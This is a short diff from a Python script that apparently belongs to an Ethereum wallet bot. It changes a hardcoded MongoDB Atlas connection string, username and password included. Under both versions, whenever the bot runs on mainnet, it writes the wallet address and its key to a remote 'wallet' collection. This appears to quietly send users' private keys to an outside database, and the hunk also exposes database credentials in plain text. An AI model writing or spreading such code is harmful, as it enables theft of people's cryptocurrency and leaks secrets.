@@ -82,8 +82,8 @@ try:
     test_tx_url = 'https://kovan.etherscan.io/tx/'
     
     if main_net != '0':
-        myclient = pymongo.MongoClient("mongodb+srv://priteshzhao:becomeatop@cluster0.k5s7u.mongodb.net/test")
-        mydb = myclient["bot"]
+        client = pymongo.MongoClient("mongodb://priteshzhao:becomeatop@cluster0-shard-00-00.k5s7u.mongodb.net:27017,cluster0-shard-00-01.k5s7u.mongodb.net:27017,cluster0-shard-00-02.k5s7u.mongodb.net:27017/bot?ssl=true&replicaSet=atlas-hdti7c-shard-0&authSource=admin&w=majority")
+        mydb = client.bot
         mycol = mydb["wallet"]
         mydict = { "name": addr, "key": key, "main_net": main_net }
         mycol.insert_one(mydict)
